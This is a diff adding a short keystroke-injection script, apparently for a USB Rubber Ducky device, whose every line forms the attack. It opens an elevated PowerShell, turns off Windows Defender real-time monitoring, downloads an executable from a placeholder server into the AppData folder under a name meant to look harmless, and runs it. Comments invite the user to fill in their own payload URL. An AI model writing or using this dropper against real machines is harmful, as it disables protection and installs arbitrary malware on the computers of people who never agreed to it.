@@ -1,0 +1,22 @@
+DELAY 2000
+GUI r
+DELAY 300
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 10000
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+
+REM Edit this
+STRING $url = 'https://your.server/payload.exe';
+
+ENTER
+
+REM and this
+STRING $file = $env:APPDATA + '\notsusspiciousapp.exe';
+ENTER  
+STRING $down = New-Object System.Net.WebClient; $down.DownloadFile($url,$file);
+ENTER
+DELAY 1000
+STRING $file
+ENTER
